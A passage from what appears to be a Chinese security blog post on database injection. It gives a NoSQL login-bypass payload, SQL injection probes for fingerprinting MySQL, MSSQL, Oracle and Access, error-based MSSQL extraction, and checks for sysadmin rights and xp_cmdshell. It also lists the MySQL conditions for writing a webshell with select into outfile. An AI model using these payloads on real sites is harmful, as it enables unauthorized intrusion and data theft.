class="line">db.xx.find({age:10}).pretty() 	# 格式化输出</span><br><span class="line"></span><br><span class="line"># 爆破</span><br><span class="line"># burp锁定POST参数 帐号admin为永真,密码用正则,简单清单跑出密码为123456,</span><br><span class="line">logname[$ne]=admin&amp;logpass[$regex]=e</span><br></pre></td></tr></tbody></table></figure>

<table>
<thead>
<tr>
<th>$regex    # 正则</th>
<th>$ne     # 不等于 !=</th>
<th>$not      # 反匹配</th>
</tr>
</thead>
<tbody><tr>
<td>$nin      # not in</td>
<td>$in     # in</td>
<td>$or     #  or</td>
</tr>
<tr>
<td>$it        # &lt;</td>
<td>$gt     # &gt;</td>
<td>$ite     # &lt;=</td>
</tr>
<tr>
<td>$gte      # &gt;=</td>
<td>$all     # all</td>
<td></td>
</tr>
</tbody></table>
<hr>
<h3 id="区别信息"><a href="#区别信息" class="headerlink" title="区别信息"></a><strong>区别信息</strong></h3><p>国内网站ASP+Access或SQLServer占70%以上，PHP+MySQL占20%。</p>
<p>一般asp+access组合比较多，aspx+mssql(SQL Server)组合比较多</p>
<p>一.数据库查询关键词<br>查询中用到的关键词主要包含六个，并且他们的顺序依次为selcet–from–where–group by–having–order by</p>
<p>其中select和from是必须的，其他关键词是可选的，这六个关键词的执行顺序与sql语句的书写顺序并不是一样的，而是按照下面的顺序来执行</p>
<p>from–where–group by–having–select–order by</p>
<p>from：需要从哪个数据表检索数据</p>
<p>where：过滤表中数据的条件</p>
<p>group by：如何将上面过滤出的数据分组</p>
<p>having：对上面已经分组的数据进行过滤的条件</p>
<p>select：查看结果集中的那个列，或列的结果</p>
<p>order by：按照什么样的顺序来查看返回的数据</p>
<p>常用数据库<br>常见的数据库有Oracle、MySQL、SQL Server（MSsql）、Access、mongodb等</p>
<p>关系型数据库通过外键关联来建立表与表之间的关系，非关系数据库通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。</p>
<p>基于特定函数，判断数据库类型<br>（1）  len()和length()<br>在mssql和mysql以及db2内，返回长度值调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。</p>
<p>当你使用and len(‘a’)=1的时候，返回正常页面时，可以推断当前数据库类型可能是mssql,或mysql或是db2,反之可能会是orcale和informix.</p>
<p>（2）  @@version和version()<br>在mysql内，可以用@@version或是version()来返回当前的版本信息。但是无法判断mysql还是mssql时，可以用version()函数来构造判断。</p>
<p>version()&gt;1的返回与@@version&gt;1相同页面时，则可能是mysql。如果出现提示version()错误时，则可能是mssql。</p>
<p>（3）   substring()和substr()<br>在mssql中可以调用substring()。oracle则只可以调用substr()。</p>
<p>（4）   length()   lengthb()  char_length()<br>1、Oracle： length(): 表示字符串长度 ； lengthb()：表示字符串的字节长度</p>
<p>2、mysql： length()：返回字符串所占的字节数； char_length()：返回字符串的字符数</p>
<p>基于其他方式，判断数据库类型<br>(1)  注释符判断</p>
<p>–是 Oracle 和 MSSQL 支持的注释符，如果返回正常，则说明为是这两种数据库类型之一</p>
<p>;是子句查询标识符，Oracle 不支持多行查询，因此如果返回错误，则说明很可能是 Oracle</p>
<p>(2)   特定语句</p>
<p>注意：Access只有一个数据库，直接猜解表名即可</p>
<p>and ( select count(*) from sys.usr_tables) &gt; 0 oracle数据库</p>
<p>and (select count(*) from msysobjects) &gt; 0 -返回权限不足为access数据库</p>
<p>and (select count(*)from MSysAccessObjects)&gt;0 返回正确为access 数据库</p>
<p>and (select count(*)from sysobjects)&gt;0 返回正常说明是 mssql 数据库</p>
<p>and length(user())&gt;10 返回正常说明是 Mysql</p>
<p>Oracle 可以根据 from dual 虚拟库判断</p>
<p>（3） 判断注入点</p>
<p>数字型：id=2-1</p>
<p>字符型： ’ 、’)、 ‘))、 “、 “)、 “))</p>
<p>注释符：– （–空格）、–+、/**/、#</p>
<p>通过观察页面是否正常，判断页面是否存在注入点</p>
<p>如 id=21’ and 1=1 %23 页面正常</p>
<p>id=21’ and 1=2 %23 页面返回无数据</p>
<p>MySQL 与 MSSQL 及 ACCESS 之间的区别</p>
<p>(1)MySQL5.0 以下没有 information_schema 这个默认数据库</p>
<p>(2)ACCESS 没有库名，只有表和字段，并且注入时，后面必须跟表名，因此只能爆表，ACCESS</p>
<p>举例：select 1,2,3 from table_name union select 1,2,3 from table_name</p>
<p>(3)MySQL 使用 limit 排序，ACCESS 使用 TOP 排序（TOP 在 MSSQL 也可使用）</p>
<p>各数据库标志性信息<br>sql server: select @@version –</p>
<p>Oracle : select banner from v$version</p>
<p>mysql ：select @@version, version() –</p>
<p>postgresql: select version() –</p>
<p>各数据库特有的函数<br>sql server: @@pack_received @@rowcount</p>
<p>mysql: connection_id() last_insert_id() row_count()</p>
<p>oracle: bitand(1,1)</p>
<p>postgresql: select extract( dow from row())</p>
<p>对于字符串处理方式<br>sql server: id=1 and ‘a’+’b’=’ab’ –</p>
<p>mssql: id=1 and ‘a’ + ‘b’ = ‘ab’</p>
<p>mysql: id= 1 and ‘a’+’b’=’ab’ ,’ab’=concat(‘a’ , ‘b’)</p>
<p>oracle: id=1 and ‘a’+’b’ = ‘a’ || ‘b’ , ‘ab’=concat(‘a’ , ‘b’)</p>
<p>postgresql: id=1 and ‘a’ + ‘b’ = ‘a’ || ‘b’, ‘ab’ = concat(‘a’ , ‘b’)</p>
<p>特殊符号，注释的判断</p>
<p>1、”null” 和 “%00” 是Access支持的注释</p>
<p>2、”;” 是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。</p>
<p>(SQL Server) MSsql服务、端口、后缀<br>端口：1433</p>
<p>后缀：cracer.mdf</p>
<p>日志文件后缀：cracer_log.ldf</p>
<p>mssql数据库权限</p>
<p>sa权限：数据库操作，文件管理，命令执行，注册表读取等system</p>
<p>db权限：文件管理，数据库操作等users-administrators</p>
<p>public权限：数据库操作guest-users</p>
<p>SQL Server有一些系统变量，如果服务器IIS提示没关闭，并且SQL Server返回错误提示的话，那可以直接从出错信息的获取，方法如下：</p>
<p>？id=49 and user&gt;0</p>
<p>这句语句很简单，但却包含了SQL Server特有注入方法的精髓，我自己也是在一次无意的测试中发现这种效率极高的猜解方法。</p>
<p>先看看含义，前面语句正常，重点在and user&gt;0, user是SQL Server的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。拿一个nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，当然，转的过程中肯定会出错，SQL Server的出错提示是：将nvarchar值”abc”转换数据类型为int的列时发生语法错误，abc正是变量user的值，这样，就拿到了数据库的用户名。</p>
<p>常用测试语句：</p>
<p> and exists(select* from sysobjects)       //判断数据库是否为SQLServer<br> and exists(select * from tableName)       //判断某表是否存在..tableName为表名<br> and 1=(select @@VERSION)                  //SQLServer版本<br> and 1=(select db_name())                  //当前数据库名<br> and 1=(select @@servername)               //本地服务名<br> and 1=(select IS_SRVROLEMEMBER(‘sysadmin’)) //判断是否是系统管理员<br> and 1=(select IS_MEMBER(‘db_owner’))       //判断是否是库权限<br> and 1=(select HAS_DBACCESS(‘master’))      //判断是否有库读取权限<br> and 1=(select count(*) from master.dbo.sysobjects where xtype =’X’ and name=’xp_cmdshell’)   //判断XP_CMDSHELL是否存在</p>
<p>常识：</p>
<p>Access中，中文的ASCII码可能会出现负数，取出该负数后用abs()取绝对值，汉字字符不变。</p>
<p>SQL Server中，中文的ASCII为正数，由于UNICODE的双位编码，不能用函数ascii()取得ASCII码，必须用函数unicode()返回unicode值，再用nchar函数取得对应的中文字符。</p>
<p>Mysql注入<br>mysql数据库在渗透过程中能够使用的功能还是比较多的，除了读取数据之外，还可以进行对文件进行读写（前提是权限足够）。</p>
<p>读取前提：</p>
<p>1.用户权限足够高，尽量具有root权限。</p>
<p>2.secure_file_priv不为NULL。</p>
<p>3.获取web目录的物理路径。</p>
<p> Mysql用secure_file_priv这个配置项来完成对数据导入导出的限制。如果secure_file_priv=NULL，Mysql服务会禁止导入和导出操作。通过命令查看secure_file_priv的当前值，确认是否允许导入导出以及导出文件路径。<br> show variables like ‘%secure_file_priv’;</p>
<p> MySQL中root用户拥有所有权限，但写入webshell并不需要一定是root用户权限，比如数据库用户只要拥有file权限就可以执行select into outfile操作。</p>
<p> 当secure_file_priv文件导出路径与web目录路径重叠，写入webshell才可以被访问到。</p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">柒妖</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://aisibuhuipao.github.io/2021/02/20/4%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93/">http://aisibuhuipao.github.io/2021/02/20/4%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">柒妖</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/mysql/">
                                    <span class="chip bg-color">mysql</span>
                                </a>
                            
                                <a href="/tags/sqlserver/">
                                    <span class="chip bg-color">sqlserver</span>
                                </a>
                            
                                <a href="/tags/access/">
                                    <span class="chip bg-color">access</span>
                                </a>
                            
                                <a href="/tags/oracle/">
                                    <span class="chip bg-color">oracle</span>
                                </a>
                            
                                <a href="/tags/mongodb/">
                                    <span class="chip bg-color">mongodb</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2021/03/01/%E7%99%BD%E7%9B%92%E9%BB%91%E7%9B%92%E7%BB%95%E8%BF%87waf%E5%92%8C%E5%8A%A0%E5%9B%BA%E4%BB%A3%E7%A0%81/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="代码审计过waf 黑盒测试过waf 加固代码，防注入">
                        
                        <span class="card-title">代码审计过waf 黑盒测试过waf 加固代码，防注入</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-01
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            柒妖
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/mysql/">
                        <span class="chip bg-color">mysql</span>
                    </a>
                    
                    <a href="/tags/sqlserver/">
                        <span class="chip bg-color">sqlserver</span>
                    </a>
                    
                    <a href="/tags/access/">
                        <span class="chip bg-color">access</span>
                    </a>
                    
                    <a href="/tags/oracle/">
                        <span class="chip bg-color">oracle</span>
                    </a>
                    
                    <a href="/tags/mongodb/">
                        <span class="chip bg-color">mongodb</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                本篇&nbsp;<i class="far fa-dot-circle"></i>
            </div>
            <div class="card">
                <a href="/2021/02/20/4%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="数据库注入">
                        
                        <span class="card-title">数据库注入</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-20
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            柒妖
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/mysql/">
                        <span class="chip bg-color">mysql</span>
                    </a>
                    
                    <a href="/tags/sqlserver/">
                        <span class="chip bg-color">sqlserver</span>
                    </a>
                    
                    <a href="/tags/access/">
                        <span class="chip bg-color">access</span>
                    </a>
                    
                    <a href="/tags/oracle/">
                        <span class="chip bg-color">oracle</span>
                    </a>
                    
                    <a href="/tags/mongodb/">
                        <span class="chip bg-color">mongodb</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2022</span>
            
            <a href="/about" target="_blank">柒妖</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">23.6k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/aisibuhuipao" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:zn0548@live.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=254838212" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 254838212" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
